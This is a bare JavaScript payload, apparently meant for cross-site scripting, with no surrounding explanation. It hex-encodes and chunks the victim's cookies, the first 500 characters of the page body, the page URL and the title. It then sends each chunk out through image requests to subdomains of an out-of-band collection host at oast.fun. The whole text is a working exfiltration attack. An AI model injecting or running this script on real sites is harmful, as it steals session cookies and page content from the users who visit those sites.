var o="da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun";
function h(s){var r='';for(var i=0;i<s.length;i++)r+=s.charCodeAt(i).toString(16).padStart(2,'0');return r}
function e(l,d){var x=h(d);var c=[];for(var i=0;i<x.length;i+=50)c.push(x.substring(i,i+50));for(var j=0;j<c.length;j++)new Image().src="http://"+l+"-"+j+"."+c[j]+"."+o+"/x";}
e("jscookie",document.cookie||"none");
e("jsbody",document.body?document.body.innerHTML.substring(0,500):"nobody");
e("jsloc",location.href);
e("jstitle",document.title||"notitle");
